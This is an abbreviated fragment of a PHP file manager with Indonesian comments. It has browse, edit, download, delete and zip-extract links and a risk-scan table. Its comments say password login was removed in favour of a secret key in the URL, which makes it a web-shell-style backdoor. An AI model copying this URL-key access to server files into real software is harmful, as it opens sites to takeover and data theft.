...
// Hapus sistem login password lama
// Kita hanya pakai secret key dari URL

// Set session agar tetap login (opsional)
...
// Tambahkan parameter x ke semua link
function addSecretParam($url) {
    global $secret_key;
    $separator = (strpos($url, '?') !== false) ? '&' : '?';
    return $url . $separator . 'x=' . urlencode($secret_key);
}
    ...
    <table class="scan-result-table">
        ...
        <tr class="risk-<?php echo strtolower($result['risk_level']); ?>">
            ...
            <td>
                ...
                <a href="?path=<?php echo urlencode(dirname($result['full_path'])); ?>&edit=<?php echo urlencode($result['full_path']); ?>&x=<?php echo urlencode($secret_key); ?>"
                   style="background:#00d4ff;color:#000;padding:3px 8px;font-size:0.8rem;border-radius:4px;margin:2px;display:inline-block;">
                    Edit
                </a>
                <?php else: ?>
                <a href="?path=<?php echo urlencode($result['full_path']); ?>&x=<?php echo urlencode($secret_key); ?>"
...
<form method="post" style="margin-top:25px;">
    ...
    <table>
        ...
        <?php if ($isDir): ?>
            <a href="?path=<?php echo urlencode($full); ?>&x=<?php echo urlencode($secret_key); ?>"><strong><?php echo htmlspecialchars($f); ?></strong></a>
        <?php else: ?>
            <?php if ($isEditable): ?>
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($full); ?>&x=<?php echo urlencode($secret_key); ?>">
        ...
        echo $isDir
        ? '-'
        : '<a href="?path=' . urlencode($path) . '&download=' . urlencode($f) . '&x=' . urlencode($secret_key) . '">Download</a>';
        ?>
        </td>
        ...
        <td>
        <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>&x=<?php echo urlencode($secret_key); ?>" onclick="return confirm('Delete?')">Delete</a>
        </td>
        ...
        echo (!$isDir && $ext == 'zip')
        ? '<a href="?path=' . urlencode($path) . '&extract=' . urlencode($f) . '&x=' . urlencode($secret_key) . '" onclick="return confirm(\'Extract here?\')">Extract</a>'
        : '-';
        ?>
        </td>
